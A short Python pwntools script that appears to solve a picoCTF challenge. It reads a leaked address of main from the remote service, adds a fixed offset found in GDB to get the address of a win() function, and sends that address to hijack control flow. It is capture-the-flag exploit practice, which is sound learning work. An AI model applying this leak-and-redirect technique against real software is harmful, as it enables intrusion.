from pwn import *

# Connect to remote service
conn = remote('rescued-float.picoctf.net', 59861)

# Read the line with main's address
main_line = conn.recvline_contains(b'Address of main:')
main_addr = int(main_line.strip().split(b': ')[1], 16)

# Calculate the offset from `GDB` output
# win = 0x12a7, main = 0x133d â†’ offset = win - main = -0x96
offset = -0x96
win_addr = main_addr + offset

log.success(f'Calculated win() address: {hex(win_addr)}')

# Send as valid hex string (like '0x5555555552a7')
conn.sendlineafter(b':', hex(win_addr).encode())
conn.interactive()